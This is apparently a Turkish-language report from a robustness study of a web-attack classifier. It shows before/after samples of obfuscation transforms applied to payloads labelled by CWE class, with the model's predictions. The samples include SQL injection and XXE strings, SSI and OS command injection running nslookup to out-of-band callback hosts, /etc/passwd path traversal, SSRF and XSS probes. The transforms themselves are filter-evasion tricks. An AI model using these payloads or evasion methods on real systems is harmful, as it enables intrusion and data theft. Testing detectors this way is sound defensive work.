# Gizleme örnekleri — ds_aug_v2_random_s42

Her dönüşüm ve sınıf için en fazla 2 örnek (yalnızca değişen kısım çevresi).

## case

Varsayım: SQLi: SQL anahtar kelimeleri; XSS: HTML etiket/öznitelik adları büyük/küçük harfe duyarsızdır.

- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `aDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%20load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv`
  - sonra: `aDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(SelECt%20load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `hHT0lBbhNkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%2520extractvalue(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2520from`
  - sonra: `hHT0lBbhNkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(sELect%2520eXtRacTVALUe(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2520fRom`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533`
  - sonra: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CeCQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6Ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `Referer: https://www.yahoo.com/za9wt%>kqdof'/"<pm4ii Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: do`
  - sonra: `Referer: https://www.yahoo.com/za9wt%>kqdof'/"<pm4II Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: do`

## whitespace

Varsayım: Payload benzeri parçalarda boşluk yerine sekme: SQL, HTML öznitelik ayırıcısı, POSIX kabuk (IFS), HTTP header OWS için eşdeğer.

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `F..%252F/index.php/my-account/edit-profile/%7B%7B%20data.image.src%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: `
  - sonra: `F..%252F/index.php/my-account/edit-profile/%7B%7B%09data.image.src%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: `
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `F..%252F/index.php/my-account/edit-profile/%7B%7B%20data.model.url HTTP/1.1 Host: test-site.com User`
  - sonra: `F..%252F/index.php/my-account/edit-profile/%7B%7B%09data.model.url HTTP/1.1 Host: test-site.com User`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522ksz%2522%2520value%253d%2522jry18svayb%2522--%253e%253c!--%2523set%2520var%253d%2522mu1%2522%2520value%253d%2522lt03auxc0d%2522--%253e%253c!--%2523echo%2520var%253d%2522ksz%2522--%253e%253c!--%2523echo%2520var%253d%2522mu1%2522--%253e%253c!--%2523exec%2520cmd%253d%2522nslookup%2520-q%253dcname%25206elovfixlyllo5bd1uje4uryiponck78z6n4`
  - sonra: `2522--%253e'--%253e%2560--%253e%253c!--%2523set%2509var%253d%2522ksz%2522%2509value%253d%2522jry18svayb%2522--%253e%253c!--%2523set%2509var%253d%2522mu1%2522%2509value%253d%2522lt03auxc0d%2522--%253e%253c!--%2523echo%2509var%253d%2522ksz%2522--%253e%253c!--%2523echo%2509var%253d%2522mu1%2522--%253e%253c!--%2523exec%2509cmd%253d%2522nslookup%2509-q%253dcname%25096elovfixlyllo5bd1uje4uryiponck78z6n4`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `44_319500; SID=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22jfi%22%20value%3d%22ieh0vri9la%22--%3e%3c!--%23set%20var%3d%22lhk%22%20value%3d%22kgj2xtkbnc%22--%3e%3c!--%23echo%20var%3d%22jfi%22--%3e%3c!--%23echo%20var%3d%22lhk%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.oastify.com%22%20--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkohxP5V-B`
  - sonra: `44_319500; SID=%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22jfi%22%09value%3d%22ieh0vri9la%22--%3e%3c!--%23set%09var%3d%22lhk%22%09value%3d%22kgj2xtkbnc%22--%3e%3c!--%23echo%09var%3d%22jfi%22--%3e%3c!--%23echo%09var%3d%22lhk%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.oastify.com%22%09--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkohxP5V-B`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `nzu1NvT8ciE-VSt0MuCDtcuq2GJ6FqxEKX8U5OxY38380321'%20or%205025%3d5025--%20; __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_`
  - sonra: `nzu1NvT8ciE-VSt0MuCDtcuq2GJ6FqxEKX8U5OxY38380321'%09or%095025%3d5025--%09; __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `Auq3; OTZ=8138023_44_48_171240_44_31950035363955'%20or%204366%3d4367--%20; SID=g.a000yQhGY0VoMOyczkohxP5V-BmARmxOUk2ao5VK_e`
  - sonra: `Auq3; OTZ=8138023_44_48_171240_44_31950035363955'%09or%094366%3d4367--%09; SID=g.a000yQhGY0VoMOyczkohxP5V-BmARmxOUk2ao5VK_e`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `A_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%20load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mss`
  - sonra: `A_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%09load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mss`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `NkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%2520extractvalue(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2520from%2520dua`
  - sonra: `NkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%2509extractvalue(xmltype('%253c%253fxml%2509version%253d%25221.0%2522%2509encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2509root%2509[%2509%253c!ENTITY%2509%2525%2509dqeqf%2509SYSTEM%2509%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2509from%2509dua`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `vice%3D1%26_reqid%3D55208%26rt%3Dc%60401&line=Not%20available HTTP/1.1 3ACVuqWd%3BZE1Tgd%3ArNScwd%3BZ`
  - sonra: `vice%3D1%26_reqid%3D55208%26rt%3Dc%60401&line=Not%09available HTTP/1.1 3ACVuqWd%3BZE1Tgd%3ArNScwd%3BZ`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `GET /_gqlug%2522%2520a%253dbwhdzs/bscframe HTTP/1.1 User-Agent: Mozill`
  - sonra: `GET /_gqlug%2522%2509a%253dbwhdzs/bscframe HTTP/1.1 User-Agent: Mozill`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.co`
  - sonra: `DELETE /api/users%26nslookup%09-q%3dcname%09cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26nslookup%09-q%3dcname%09cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.co`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users/2%26nslookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.c`
  - sonra: `DELETE /api/users/2%26nslookup%09-q%3dcname%09zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.com.%26'%5c%22%600%26nslookup%09-q%3dcname%09zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.c`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `GET /%3cbeu%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//tgdesurivmblxmhssfk4mh8nfel8994`
  - sonra: `GET /%3cbeu%09xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%09href%3d%22http%3a//tgdesurivmblxmhssfk4mh8nfel8994`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `GET /%3cgcn%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//kj75vlu9ydec0dkjv6nvp8bei5ozcq8`
  - sonra: `GET /%3cgcn%09xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%09href%3d%22http%3a//kj75vlu9ydec0dkjv6nvp8bei5ozcq8`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66655%26rt%3Dc%60401&line=Not%20available HTTP/1.1 5nYTd%3AZDZcre%3BKKym4b%3AwA3h`
  - sonra: `vice%3D1%26_reqid%3D66655%26rt%3Dc%60401&line=Not%09available HTTP/1.1 5nYTd%3AZDZcre%3BKKym4b%3AwA3h`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
  - sonra: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`

## sql_comment

Varsayım: SQL anahtar kelimelerine bitişik boşluk yerine /**/ (MySQL, PostgreSQL, MSSQL'de eşdeğer).

- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%20load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mss`
  - sonra: `_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%2f%2a%2a%2fload_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mss`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `kZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%2520extractvalue(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2520from%2520dual`
  - sonra: `kZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%252f%252a%252a%252fextractvalue(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%25`

## cmd_quote

Varsayım: Kabuk komut adına boş tırnak çifti ("") eklemek (bash/sh ve cmd.exe komut adını değiştirmez).

- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfz`
  - sonra: `DELETE /api/users%26n%22%22slookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26n%22%22slookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfz`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users/2%26nslookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby24`
  - sonra: `DELETE /api/users/2%26n%22%22slookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby240s2wqrei65wtl.oastify.com.%26'%5c%22%600%26n%22%22slookup%20-q%3dcname%20zormdzxjysn2xc2up2akdyhby24`

## path_dot

Varsayım: '../' yerine './../' (yol çözümlemesinde eşdeğer).

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
  - sonra: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
  - sonra: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`

## artifact

Varsayım: Burp Collaborator alan adı (oastify.com) saldırganın seçtiği başka bir geri çağırma alan adıyla değiştirilir (alt alan adı korunur).

- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `e%25206elovfixlyllo5bd1uje4uryiponck78z6n4gr9e12q.oastify.com%2522%2520--%253e; cmp=t=1750672068&j=0&u=1---; gp`
  - sonra: `e%25206elovfixlyllo5bd1uje4uryiponck78z6n4gr9e12q.cb-listener.net%2522%2520--%253e; cmp=t=1750672068&j=0&u=1---; gp`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `dcname%20514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.oastify.com%22%20--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkoh`
  - sonra: `dcname%20514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.cb-listener.net%22%20--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkoh`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 79 - Cross-Site Scripting)
  - önce: `st-3PLSID=as6s9jw1z2zp29phfyxiiy52wt2pqlt9lxekd82.oastify.com; HSID=AKYItVA_0uY6P_otT; SSID=AtzZ80Vc7EiNBpUwi; `
  - sonra: `st-3PLSID=as6s9jw1z2zp29phfyxiiy52wt2pqlt9lxekd82.cb-listener.net; HSID=AKYItVA_0uY6P_otT; SSID=AtzZ80Vc7EiNBpUwi; `
- **248 - Command Injection** (tahmin: 248 - Command Injection → 79 - Cross-Site Scripting)
  - önce: `; SAPISID=k0l2ht4b7c7zajxrn85sq8dc43azyv1jt7mupie.oastify.com; __Secure-1PAPISID=eOcr7KoQAqtqDqaI/At8SMu6J6kwRZ`
  - sonra: `; SAPISID=k0l2ht4b7c7zajxrn85sq8dc43azyv1jt7mupie.cb-listener.net; __Secure-1PAPISID=eOcr7KoQAqtqDqaI/At8SMu6J6kwRZ`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mssngki89ax3ku8j.oastify.com%5c%5cqmi')); A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3`
  - sonra: `%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mssngki89ax3ku8j.cb%2dlistener.net%5c%5cqmi')); A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `c%255cizl0gr396a6x9hwpm64qp6ca319wxq1eshgf925pydn.oastify.com%255c%255cbqy'))%252b'%26tbla%3dy-OOQKF4VE2uIbjYri`
  - sonra: `c%255cizl0gr396a6x9hwpm64qp6ca319wxq1eshgf925pydn.cb-listener.net%255c%255cbqy'))%252b'%26tbla%3dy-OOQKF4VE2uIbjYri`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26%60'/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Wind`
  - sonra: `3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.cb-listener.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.cb-listener.net.%26%60'/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Wind`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: ` -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.oastify.com.&'\"`0&nslookup -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.oastify.com.&`' Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors`
  - sonra: ` -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.cb-listener.net.&'\"`0&nslookup -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.cb-listener.net.&`' Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.oastify.com/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.cb-listener.net/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `ed-Host: f6m0igh4l817n87ei1aqc3y950buzy3mvpjf65uu.oastify.com Pragma: no-cache Cache-Control: no-cache, no-tr`
  - sonra: `ed-Host: f6m0igh4l817n87ei1aqc3y950buzy3mvpjf65uu.cb-listener.net Pragma: no-cache Cache-Control: no-cache, no-tr`

## encoding_norm

Varsayım: ÇÖZÜCÜYE BAĞLI: çok katmanlı URL encoding tek katmana indirilir; hedef yinelemeli çözüyorsa eşdeğer.

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
  - sonra: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%26S%3DAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
  - sonra: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%26S%3DAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3d1%26s%3dRpo3auix%26d%3d%2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522ksz%2522%2520value%253d%2522jry18svayb%2522--%253e%253c!--%2523set%2520var%253d%2522mu1%2522%2520value%253d%2522lt03auxc0d%2522--%253e%253c!--%2523echo%2520var%253d%2522ksz%2522--%253e%253c!--%2523echo%2520var%253d%2522mu1%2522--%253e%253c!--%2523exec%2520cmd%`
  - sonra: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3D1%26s%3DRpo3auix%26d%3D%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%22ksz%22%20value%3D%22jry18svayb%22--%3E%3C!--%23set%20var%3D%22mu1%22%20value%3D%22lt03auxc0d%22--%3E%3C!--%23echo%20var%3D%22ksz%22--%3E%3C!--%23echo%20var%3D%22mu1%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%206elovfixlyllo5bd1uje4uryiponck78z6n4gr9e12q.oastify.com%22%`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3d1%26s%3dRpo3auix%26d%3d%2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522odr%2522%2520value%253d%2522ncq5twgejf%2522--%253e%253c!--%2523set%2520var%253d%2522qft%2522%2520value%253d%2522pes7vyiglh%2522--%253e%253c!--%2523echo%2520var%253d%2522odr%2522--%253e%253c!--%2523echo%2520var%253d%2522qft%2522--%253e%253c!--%2523exec%2520cmd%`
  - sonra: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3D1%26s%3DRpo3auix%26d%3D%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%22odr%22%20value%3D%22ncq5twgejf%22--%3E%3C!--%23set%20var%3D%22qft%22%20value%3D%22pes7vyiglh%22--%3E%3C!--%23echo%20var%3D%22odr%22--%3E%3C!--%23echo%20var%3D%22qft%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%20azdsgj31626p99whmy4ipyc23t9rxnybq9e77u0hs5h.oastify.com%22%`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%253A%252F%252Fsync.taboola.com%252Fsg%252Frtb-pubmatic-network%252F1%252Frtb-h%253Ftaboola_hm%253D%2523PMUID^1^0; pi=156307:2; KADUSERCOOKIE=80EF1FE2-0`
  - sonra: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%3A%2F%2Fsync.taboola.com%2Fsg%2Frtb-pubmatic-network%2F1%2Frtb-h%3Ftaboola_hm%3D%23PMUID^1^0; pi=156307:2; KADUSERCOOKIE=80EF1FE2-0`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `lM; _hp2_hld1033168692261722.1566116007=kyo1vo3b8t%2527%2522`'"/kyo1vo3b8t/><kyo1vo3b8t/\>qu1f6hdl5x&; _hp2_hld6622829229376580.1566116007=rrvi2o79qe%2527%2522`'"/rrvi2o79qe/><rrvi2o79qe/\>rujiylmhjk&; _hp2_props.1566116007=%7B%22campaignId%22%3A%22580662%22%2C%22environment%22%3A%22prod%22%2C%22hasCartEnabled%22%3Afalse%2C%22orgId%22%3A83430%2C%22campaignType%22%3A%22studio%22%2C%22classy-session`
  - sonra: `lM; _hp2_hld1033168692261722.1566116007=kyo1vo3b8t'"`'"/kyo1vo3b8t/><kyo1vo3b8t/\>qu1f6hdl5x&; _hp2_hld6622829229376580.1566116007=rrvi2o79qe'"`'"/rrvi2o79qe/><rrvi2o79qe/\>rujiylmhjk&; _hp2_props.1566116007=%7B%22campaignId%22%3A%22580662%22%2C%22environment%22%3A%22prod%22%2C%22hasCartEnabled%22%3Afalse%2C%22orgId%22%3A83430%2C%22campaignType%22%3A%22studio%22%2C%22classy-session-id%22%3A%224Xey`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3d1%26s%3dRpo3auix%26d%3dA685925d6%257cYPcb0Hn.2Wryt9O9ybqO3Kf_vwISX0T4Rkji3GxwHKuYY92Ipma8ILOYB6YL3gLswUh0mNEspBh0NiQoGaDb1e_Bk7i.oYHtzltlDVBmbFTtglK2a2fSHI8dcQcIAxrnVydq3y4p.h1vgAAvt56Pfb954aWbIjpG6J_zGTmauExkWT3bnFBbyjWyU1vrfpcigMtaYsTs9z2DLnNuu8XTq7gKRr.uOV.oouYeE60N5SfhN.4gwvjmFtcnXVAytD6EAU4MKEmFV.QdbT1659mA0K8sygWRFmz1gVVYiBxoQYLJKV75_ZxCJ2BY`
